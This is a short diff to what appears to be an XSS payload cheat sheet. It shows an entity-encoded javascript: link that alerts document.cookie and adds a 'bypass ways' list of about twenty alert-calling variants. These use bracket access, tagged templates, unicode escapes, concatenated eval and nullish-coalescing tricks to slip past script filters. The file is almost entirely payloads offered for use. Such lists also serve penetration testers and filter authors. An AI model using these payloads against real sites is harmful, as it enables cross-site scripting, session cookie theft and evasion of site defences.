@@ -17,3 +17,24 @@
 
 # low impact
 <a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
+
+
+# bypass ways
+window.alert()
+window['alert']()
+alert()
+alert``
+onload=alert
+\u0061lert()
+globalThis.alert()
+window?.alert()
+eval?.('ale'+'rt('+')')
+[1].find(alert)
+
+好=alert,好()
+var x=x||alert;x()
+alert(1),ErrExit
+[][0]??alert()
+null??alert()
+undefined??alert()
+x??alert();var x;
